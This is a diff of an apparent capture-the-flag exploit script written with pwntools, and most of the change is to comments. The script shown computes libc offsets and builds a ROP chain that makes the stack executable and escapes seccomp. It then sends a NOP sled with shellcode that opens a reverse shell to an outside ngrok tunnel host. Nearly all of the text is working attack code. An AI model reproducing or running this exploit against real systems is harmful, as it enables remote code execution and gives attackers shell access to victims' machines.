@@ -30,7 +30,7 @@ libc_off = 0x49230 - 0x90 + 0x400
 strt_off = libc.sym['__libc_start_main']
 nlglolo_off = libc.sym['_nl_global_locale']
 nlupper_off = libc.sym['_nl_C_LC_CTYPE_toupper']
-pthreadexit_off = libc.sym['pthread_exit']
+pthreadexit_off = libc.sym['pthread_exit'] #needs to be changed to exit syscall to not mess up stack
 
 shellcode = shellcraft.connect('0.tcp.ngrok.io', 18841)
 shellcode += shellcraft.dupsh()
@@ -55,7 +55,7 @@ log.info('Shellcode len: ' + hex(len(asm(shellcode))))
 
 add(19, (0x10 * 8 + 0x80) - (libc_off + strt_off + 243), False)
 
-#create rop feng shui chain to call __make_stacks_executable then return pthread_exit
+#create rop feng shui chain to pivot stack forward for better position then call __make_stacks_executable then return to main thread with exit
 
 rop = ROP(libc)
 
@@ -67,7 +67,7 @@ add(buf_off + 22, -0x90)
 add(buf_off + 262, pthreadexit_off - (nlupper_off + 512))
 add(buf_off + 258, (libp_off + stkexec_off + 32) - (libc_off + nlglolo_off)) #idk why this one has to be last
 
-#add shell code while also calling rop chain which eventually runs shellcode without seccomp
+#add shell code while also calling rop chain which eventually runs shellcode from main thread without seccomp
 #use this to connect to shell with ngrok
 #gdb.attach(p)
 p.sendlineafter('(y/N)', b'\x90' * 0x100 + asm(shellcode))
